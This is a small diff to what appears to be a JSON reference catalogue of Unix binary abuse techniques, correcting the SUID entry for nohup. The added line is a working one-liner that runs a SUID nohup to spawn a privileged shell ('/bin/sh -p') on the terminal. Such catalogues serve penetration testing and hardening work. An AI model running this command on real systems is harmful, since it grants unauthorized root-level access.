@@ -17,7 +17,7 @@
     ],
     "suid": [
       {
-        "code": "sudo nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
+        "code": "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
       }
     ]
   }
